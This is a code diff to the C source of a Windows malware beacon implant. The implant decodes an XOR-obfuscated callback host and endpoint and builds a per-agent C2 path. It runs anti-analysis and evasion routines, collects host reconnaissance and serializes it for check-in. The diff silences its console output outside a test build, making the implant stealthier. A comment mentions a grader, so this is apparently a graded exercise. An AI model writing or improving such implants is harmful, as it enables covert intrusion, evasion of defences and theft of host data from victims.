@@ -8,6 +8,12 @@
 #include "killswitch.h"
 #include "recon.h"
 
+#ifdef BEACON_TEST
+  #define DBG(fmt, ...) printf(fmt, ##__VA_ARGS__)
+#else
+  #define DBG(fmt, ...) ((void)0)
+#endif
+
 // ── XOR-decoded config globals ──────────────────────────────────────
 static BYTE _host_xor[]     = CALLBACK_HOST_XOR;
 static BYTE _endpoint_xor[] = CALLBACK_ENDPOINT_XOR;
@@ -35,6 +41,19 @@ VOID beacon_decode_config(VOID) {
     memcpy(g_AgentIdPrefix, _prefix_xor, AGENT_ID_PREFIX_XOR_LEN);
     g_AgentIdPrefix[AGENT_ID_PREFIX_XOR_LEN] = '\0';
 
+    // Build full endpoint: /api/agents/{agent_id}
+    {
+        WCHAR wideId[64] = {0};
+        // Convert narrow agent ID to wide
+        for (int i = 0; i < AGENT_ID_PREFIX_XOR_LEN && g_AgentIdPrefix[i]; i++)
+            wideId[i] = (WCHAR)g_AgentIdPrefix[i];
+
+        // Append "/{agent_id}" to the endpoint (e.g. /api/agents → /api/agents/ABC123)
+        DWORD epLen = (DWORD)lstrlenW(g_CallbackEndpoint);
+        g_CallbackEndpoint[epLen] = L'/';
+        lstrcpyW(&g_CallbackEndpoint[epLen + 1], wideId);
+    }
+
     // Install factory-injected session key if present
 #ifdef SESSION_KEY_XOR
     {
@@ -49,13 +68,13 @@ VOID beacon_decode_config(VOID) {
     }
 #endif
 
-    printf("[BEACON] Config decoded: host=%S endpoint=%S prefix=%s\n",
-           g_CallbackHost, g_CallbackEndpoint, g_AgentIdPrefix);
+    DBG("[BEACON] Config decoded: host=%S endpoint=%S prefix=%s\n",
+        g_CallbackHost, g_CallbackEndpoint, g_AgentIdPrefix);
 }
 
 
 VOID beacon_run() {
-    printf("[*] beacon_run() starting\n");
+    DBG("[*] beacon_run() starting\n");
 
     // 0 -- decode XOR'd config strings
     beacon_decode_config();
@@ -64,7 +83,7 @@ VOID beacon_run() {
     anti_analysis_run(FALSE);
     if(!evasion_run())
     {
-        printf("[!]Evasion failed --continuing\n");
+        DBG("[!]Evasion failed --continuing\n");
     }
 
     // 2 -- IP gate (comms.c, Mod 21/73)
@@ -83,7 +102,9 @@ VOID beacon_run() {
         // collect host recon
         CHECKIN_INFO info = {0};
         recon_collect(&info);
-        recon_print(&info); // visible output for grader
+#ifdef BEACON_TEST
+        recon_print(&info); // visible output for test/grader only
+#endif
 
         // serialize to JSON
         CHAR* pJson = NULL;
